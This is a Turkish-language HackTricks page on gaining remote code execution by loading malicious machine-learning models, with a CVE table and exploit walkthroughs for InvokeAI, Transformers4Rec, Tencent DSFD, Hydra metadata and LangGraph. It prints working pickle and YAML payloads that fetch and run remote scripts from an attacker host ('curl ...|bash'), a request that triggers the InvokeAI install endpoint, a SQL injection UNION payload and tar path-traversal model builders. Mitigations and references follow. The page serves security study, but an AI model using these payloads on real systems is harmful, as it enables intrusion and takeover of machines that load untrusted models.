# Models RCE

{{#include ../banners/hacktricks-training.md}}

## RCE için modelleri yükleme

Machine Learning modelleri genellikle ONNX, TensorFlow, PyTorch vb. farklı formatlarda paylaşılır. Bu modeller, kullanılmak üzere geliştiricilerin makinelerine veya production sistemlerine yüklenebilir. Normalde modeller kötü amaçlı kod içermemelidir; ancak bazı durumlarda model, amaçlanan bir özellik olarak veya model yükleme kütüphanesindeki bir vulnerability nedeniyle sistemde arbitrary code execute etmek için kullanılabilir.

Yazım sırasında bu tür vulnerability örneklerinden bazıları şunlardır:

| **Framework / Tool**        | **Vulnerability (varsa CVE)**                                                    | **RCE Vector**                                                                                                                           | **References**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Insecure deserialization in* `torch.load` **(CVE-2025-32434)**                                                              | Model checkpoint içindeki malicious pickle, code execution sağlar (`weights_only` safeguard'ını bypass ederek)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + malicious model download code execution'a neden olur; management API'de Java deserialization RCE                                        | |
| **NVIDIA Merlin Transformers4Rec** | `torch.load` üzerinden unsafe checkpoint deserialization **(CVE-2025-23298)**                                           | Untrusted checkpoint, `load_model_trainer_states_from_checkpoint` sırasında pickle reducer'ını tetikleyerek ML worker içinde code execution sağlar            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/) |
| **LangGraph** (SQLite/Redis checkpointers) | SQLi + unsafe MessagePack extension hook **(CVE-2025-67644, CVE-2026-28277, CVE-2026-27022)** | Kullanıcı kontrollü `filter` key'i SQL/JSON-path syntax enjekte eder, `UNION SELECT` sahte bir checkpoint row oluşturur; ardından `msgpack` deserialization, attacker'ın seçtiği Python kodunu import edip çağırır | [Check Point 2026](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (unsafe YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | YAML'den model yüklemek `yaml.unsafe_load` kullanır (code exec) <br> **Lambda** layer içeren modeli yüklemek arbitrary Python code çalıştırır          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsing)                                                                                          | Crafted `.tflite` model integer overflow'u tetikler → heap corruption (potential RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | `joblib.load` üzerinden model yüklemek, attacker'ın `__reduce__` payload'ını içeren pickle'ı execute eder                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (unsafe `np.load`) *disputed*                                                                              | `numpy.load` varsayılan olarak pickled object array'lerine izin veriyordu – malicious `.npy/.npz` code exec'i tetikler                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | ONNX modelinin external-weights path'i directory dışına çıkabilir (arbitrary file read) <br> Malicious ONNX model tar'ı arbitrary file'ların üzerine yazabilir (RCE'ye yol açarak) | |
| ONNX Runtime (design risk)  | *(No CVE)* ONNX custom ops / control flow                                                                                    | Custom operator içeren model, attacker'ın native code'unun yüklenmesini gerektirir; karmaşık model graph'leri logic'i abuse ederek amaçlanmayan computation'ları execute eder   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | `--model-control` etkin durumdayken model-load API kullanmak, relative path traversal ile file yazılmasına izin verir (ör. RCE için `.bashrc`'nin üzerine yazma)    | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (multiple heap overflows)                                                                         | Malformed GGUF model file, parser içinde heap buffer overflow'larına neden olarak victim system üzerinde arbitrary code execution sağlar                     | |
| **Keras (older formats)**   | *(No new CVE)* Legacy Keras H5 model                                                                                         | Lambda layer içeren malicious HDF5 (`.h5`) model, load sırasında code execute etmeye devam eder (Keras safe_mode eski formatı kapsamaz – “downgrade attack”) | |
| **Others** (general)        | *Design flaw* – Pickle serialization                                                                                         | Birçok ML tool'u (ör. pickle-based model format'ları ve Python `pickle.load`), mitigation uygulanmadığı sürece model file'larına gömülü arbitrary code'u execute eder | |
| **NeMo / uni2TS / FlexTok (Hydra)** | `hydra.utils.instantiate()`'a aktarılan untrusted metadata **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | Attacker-controlled model metadata/config, `_target_` değerini arbitrary callable'a (ör. `builtins.exec`) ayarlar → load sırasında, “safe” format'larda bile (`.safetensors`, `.nemo`, repo `config.json`) execute edilir | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

Ayrıca [PyTorch](https://github.com/pytorch/pytorch/security) tarafından kullanılanlar gibi, `weights_only=True` ile yüklenmediğinde sistem üzerinde arbitrary code execute etmek için kullanılabilen bazı Python pickle-based modeller de vardır. Bu nedenle pickle-based herhangi bir model, yukarıdaki tabloda listelenmemiş olsa bile bu tür attack'lara karşı özellikle susceptible olabilir.

### Hydra metadata → RCE (safetensors ile bile çalışır)

`hydra.utils.instantiate()`, bir configuration/metadata object içindeki dotted `_target_` değerini import eder ve çağırır. Kütüphaneler **untrusted model metadata**'yı `instantiate()`'a aktardığında, attacker model load sırasında hemen çalışacak bir callable ve arguments sağlayabilir (pickle gerekmez).<sup>[[12]](#references)</sup>

Payload örneği (`.nemo` `model_config.yaml`, repo `config.json` veya `.safetensors` içindeki `__metadata__` ile çalışır):
```yaml
_target_: builtins.exec
_args_:
- "import os; os.system('curl http://ATTACKER/x|bash')"
```
Ana noktalar:
- NeMo `restore_from/from_pretrained`, uni2TS HuggingFace coders ve FlexTok loaders içinde model initialization öncesinde tetiklenir.
- Hydra’nın string block-list’i, alternatif import path’leri (ör. `enum.bltns.eval`) veya application tarafından çözümlenen adlar (ör. `nemo.core.classes.common.os.system` → `posix`) kullanılarak bypass edilebilir.
- FlexTok ayrıca stringified metadata’yı `ast.literal_eval` ile parse eder; bu da Hydra çağrısından önce DoS’a (CPU/memory blowup) olanak tanır.

### 🆕  `torch.load` üzerinden InvokeAI RCE (CVE-2024-12029)

`InvokeAI`, Stable-Diffusion için popüler bir open-source web interface’tir. **5.3.1 – 5.4.2** sürümleri, kullanıcıların arbitrary URL’lerden model download edip load etmesine izin veren `/api/v2/models/install` REST endpoint’ini sunar.<sup>[[1]](#references)</sup>

Endpoint dahili olarak sonunda şunu çağırır:
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
Dosya **PyTorch checkpoint (`*.ckpt`)** olduğunda, `torch.load` bir **pickle deserialization** işlemi gerçekleştirir. İçerik doğrudan kullanıcı tarafından kontrol edilen URL'den geldiği için saldırgan, checkpoint içine özel bir `__reduce__` metoduna sahip kötü amaçlı bir nesne yerleştirebilir; bu metot **deserialization sırasında** çalıştırılır ve InvokeAI sunucusunda **remote code execution (RCE)** ile sonuçlanır.

Bu güvenlik açığına **CVE-2024-12029** (CVSS 9.8, EPSS %61.17) atanmıştır.

#### Exploitation walk-through

1. Kötü amaçlı bir checkpoint oluşturun:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. `payload.ckpt` dosyasını kontrol ettiğiniz bir HTTP server üzerinde barındırın (ör. `http://ATTACKER/payload.ckpt`).
3. Vulnerable endpoint'i tetikleyin (authentication gerekmez):
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false → no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. InvokeAI dosyayı indirdiğinde `torch.load()` çağrılır → `os.system` gadget'ı çalışır ve saldırgan, InvokeAI process'i bağlamında code execution elde eder.

Hazır exploit: **Metasploit** modülü `exploit/linux/http/invokeai_rce_cve_2024_12029` tüm akışı otomatikleştirir.<sup>[[3]](#references)</sup>

#### Koşullar

•  InvokeAI 5.3.1-5.4.2 (scan flag varsayılan olarak **false**)
•  `/api/v2/models/install` saldırgan tarafından erişilebilir olmalı
•  Process, shell komutlarını çalıştırma izinlerine sahip olmalı

#### Mitigations

* **InvokeAI ≥ 5.4.3** sürümüne yükseltin – patch, varsayılan olarak `scan=True` ayarlar ve deserialization işleminden önce malware scanning gerçekleştirir.
* Checkpoint'leri programatik olarak yüklerken `torch.load(file, weights_only=True)` veya yeni [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) helper'ını kullanın.
* Model kaynakları için allow-list / signature uygulayın ve servisi least-privilege ile çalıştırın.

> ⚠️ Güvenilmeyen kaynaklardan deserialize edilmesi, herhangi bir Python pickle tabanlı formatın (birçok `.pt`, `.pkl`, `.ckpt`, `.pth` dosyası dahil) inherently unsafe olduğu anlamına gelir.

---

Daha eski InvokeAI sürümlerini reverse proxy arkasında çalıştırmaya devam etmeniz gerekiyorsa kullanılabilecek ad hoc mitigation örneği:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
### 🆕 NVIDIA Merlin Transformers4Rec RCE via unsafe `torch.load` (CVE-2025-23298)

NVIDIA’nın Merlin’in bir parçası olan Transformers4Rec’i, kullanıcı tarafından sağlanan yollar üzerinde doğrudan `torch.load()` çağıran unsafe bir checkpoint loader içeriyordu. `torch.load`, Python `pickle` mekanizmasına dayandığından, saldırganın kontrolündeki bir checkpoint, deserialization sırasında bir reducer aracılığıyla arbitrary code çalıştırabilir.<sup>[[5]](#references)</sup>

Vulnerable path (pre-fix): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Bunun RCE’ye yol açmasının nedeni: Python pickle’da bir nesne, bir callable ve argümanlar döndüren bir reducer (`__reduce__`/`__setstate__`) tanımlayabilir. Callable, unpickling sırasında çalıştırılır. Böyle bir nesne checkpoint içinde bulunuyorsa, herhangi bir weights kullanılmadan önce çalışır.

Minimal malicious checkpoint example:
```python
import torch

class Evil:
def __reduce__(self):
import os
return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
"model_state_dict": Evil(),
"trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```
Teslimat vektörleri ve etki alanı:
- Repolar, bucket'lar veya artifact registry'leri üzerinden paylaşılan Trojanized checkpoint/model'ler
- Checkpoint'leri otomatik olarak yükleyen otomatik resume/deploy pipeline'ları
- Execution, genellikle yükseltilmiş ayrıcalıklara sahip training/inference worker'ları içinde gerçekleşir (ör. container'larda root)

Düzeltme: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802), doğrudan `torch.load()` kullanımını `transformers4rec/utils/serialization.py` içinde uygulanan, kısıtlı ve allow-list kullanan bir deserializer ile değiştirdi. Yeni loader, type/field'ları doğrular ve load sırasında arbitrary callable'ların çağrılmasını engeller.<sup>[[7]](#references)</sup>

PyTorch checkpoint'lerine özgü defensive guidance:
- Güvenilmeyen verileri unpickle etmeyin. Mümkün olduğunda [Safetensors](https://huggingface.co/docs/safetensors/index) veya ONNX gibi non-executable format'ları tercih edin.
- PyTorch serialization kullanmanız gerekiyorsa `weights_only=True` değerinin etkin olduğundan emin olun (daha yeni PyTorch sürümlerinde desteklenir) veya Transformers4Rec patch'ine benzer, custom allow-list kullanan bir unpickler kullanın.
- Model provenance/signature'larını zorunlu kılın ve deserialization işlemini sandbox'a alın (seccomp/AppArmor; non-root user; kısıtlı FS ve network egress yok).
- Checkpoint load sırasında ML servislerinden beklenmeyen child process'leri izleyin; `torch.load()`/`pickle` kullanımını trace edin.

POC ve vulnerable/patch referansları:<sup>[[8]](#references)[[9]](#references)[[10]](#references)</sup>
- Vulnerable pre-patch loader: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js
- Malicious checkpoint POC: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js
- Post-patch loader: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js

## Örnek – malicious PyTorch model oluşturma

- Modeli oluşturun:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- Modeli yükleyin:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
### Deserialization Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

Tencent’in FaceDetection-DSFD projesi, kullanıcı kontrollü verilerin deserialization işleminden geçirildiği bir `resnet` endpoint’i sunar. ZDI, uzaktaki bir saldırganın kurbanı kötü amaçlı bir sayfa/dosya yüklemeye zorlayabileceğini, bu sayfanın endpoint’e hazırlanmış bir serialized blob göndermesini sağlayabileceğini ve deserialization işlemini `root` olarak tetikleyerek sistemin tamamen ele geçirilmesine yol açabileceğini doğruladı.

Exploit akışı, tipik pickle abuse yöntemini izler:
```python
import pickle, os, requests

class Payload:
def __reduce__(self):
return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
headers={"Content-Type": "application/octet-stream"})
```
Deserialization sırasında erişilebilen herhangi bir gadget (constructor'lar, `__setstate__`, framework callback'leri vb.), taşımanın HTTP, WebSocket veya izlenen bir dizine bırakılan bir dosya üzerinden gerçekleşmesinden bağımsız olarak aynı şekilde weaponize edilebilir.



### LangGraph checkpointer SQLi → MessagePack RCE

Bu attack chain ilginçtir; çünkü attacker'ın **malicious bir model file upload etmesine gerek yoktur**. Bunun yerine uygulama bir **AI-agent persistence API**'si (`get_state_history(..., filter=...)`) sunar ve user input, checkpointer query builder'a ulaşır.

#### 1. Metadata filter'larında structural SQLi

Vulnerable bir SQLite pattern'i şu şekilde görünüyordu:
```python
for query_key, query_value in filter.items():
operator, param_value = _where_value(query_value)
predicates.append(
f"json_extract(CAST(metadata AS TEXT), '$.{query_key}') {operator}"
)
```
Değer daha sonra bind edilir, ancak `query_key` **JSON path string** içine birleştirilir; bu nedenle dictionary key içindeki bir `'`, `'$.{query_key}'` içinden çıkarak SQL injection gerçekleştirir. Aynı ders **JSON paths, identifiers, operators, `LIMIT` ve TTL fields** için de geçerlidir: placeholders yalnızca değerleri korur, yapısal query syntax'ını değil.

#### 2. `UNION SELECT` yalnızca data theft için değil, downstream sinks'i hedeflemek için de kullanılabilir

Query, daha sonra şu şekilde tüketilen `type` ve serialize edilmiş `checkpoint` bytes değerlerini döndürür:
```python
self.serde.loads_typed((type, checkpoint))
```
Bu, `WHERE` clause içindeki bir SQLi'nin **sahte bir sonuç satırı** enjekte edebileceği anlamına gelir:
```sql
UNION SELECT 'thread1', 'ns', 'checkpoint1', NULL, 'msgpack', X'<payload>', '{}'
```
Daha sonraki kod seçilen herhangi bir sütunu parse eder, deserialize eder, yazar veya çalıştırırsa bu sütunları sink'leriyle eşleştirin. Bu durumda sahte satır, SQLi'yi **attacker-controlled deserialization** işlemine dönüştürür.

#### 3. Unsafe MessagePack extension hooks code gadget'lara eşdeğerdir

LangGraph'in `msgpack` yolu, iç içe bir tuple'ı unpack eden ve şunu çalıştıran özel bir extension hook kullanıyordu:
```python
getattr(importlib.import_module(tup[0]), tup[1])(tup[2])
```
Dolayısıyla `("os", "system", "id > /tmp/pwned")` öğesine eşdeğer bir MessagePack extension object encoding, `os` modülünü import eder, `system` öğesini çözümler ve komutu çalıştırır. AI framework'lerini incelerken **custom MessagePack/JSON/pickle revivers** içinde dynamic imports, reflection veya arbitrary callable dispatch olup olmadığını kontrol edin.

#### 4. Agent framework'leri için pratik audit pattern'i

Kullanıcı tarafından kontrol edilen ve aşağıdakilere ulaşan tüm input'ları inceleyin:
- state history / memory / replay / checkpoint listing API'leri
- SQL veya Redis query fragment'leri oluşturan structured filter builder'lar
- custom deserializer'lar (`pickle`, `msgpack`, `json` object hook'ları, YAML constructor'ları)
- persistence layer tarafından döndürülen row'lara güvenen recovery path'ler

Bu specific chain, güvenilmeyen kullanıcıların `filter`'ı kontrol edebildiği **SQLite** veya **Redis** checkpointer kullanan self-hosted LangGraph deployment'larını etkiledi. Disclosure'da belirtilen patched version'lar `langgraph-checkpoint-sqlite 3.0.1+`, `langgraph 1.0.10+`, `langgraph-checkpoint-redis 1.0.2+` ve `langgraph-checkpoint 4.0.1+` idi.<sup>[[15]](#references)</sup>

## Path Traversal'a Açık Modeller

[**Bu blog postunda**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties) belirtildiği gibi, farklı AI framework'leri tarafından kullanılan çoğu model formatı, genellikle `.zip` olmak üzere archive'lara dayanır. Bu nedenle, bu formatları abuse ederek Path Traversal saldırıları gerçekleştirmek ve modelin yüklendiği sistemden arbitrary file'ları okumak mümkün olabilir.<sup>[[16]](#references)</sup>

Örneğin, aşağıdaki kod ile yüklendiğinde `/tmp` directory'si içinde bir file oluşturacak bir model oluşturabilirsiniz:
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
Veya, aşağıdaki kodla yüklendiğinde `/tmp` dizinine bir symlink oluşturacak bir model oluşturabilirsiniz:
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
### Derinlemesine inceleme: Keras .keras deserialization ve gadget hunting

. keras internals, Lambda-layer RCE, ≤ 3.8 sürümlerindeki arbitrary import issue ve fix sonrasında allowlist içinde gadget discovery hakkında kapsamlı bir rehber için bkz.:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## Referanslar

- [1] [OffSec blog – "CVE-2024-12029 – InvokeAI Deserialization of Untrusted Data"](https://www.offsec.com/blog/cve-2024-12029/)
- [2] [InvokeAI patch commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [3] [Rapid7 Metasploit module documentation](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [4] [PyTorch – security considerations for torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [5] [ZDI blog – CVE-2025-23298 Getting Remote Code Execution in NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [6] [ZDI advisory: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [7] [Transformers4Rec patch commit b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [8] [Pre-patch vulnerable loader (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [9] [Malicious checkpoint PoC (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [10] [Post-patch loader (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [11] [Hugging Face Transformers](https://github.com/huggingface/transformers)
- [12] [Unit 42 – Remote Code Execution With Modern AI/ML Formats and Libraries](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [13] [Hydra instantiate docs](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [14] [Hydra block-list commit (warning about RCE)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)
- [15] [Check Point Research – From SQLi to RCE: Exploiting LangGraph's Checkpointer](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/)
- [16] [Pivoting Archive Slip Bugs into High-Value AI/ML Bounties](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties)

{{#include ../banners/hacktricks-training.md}}
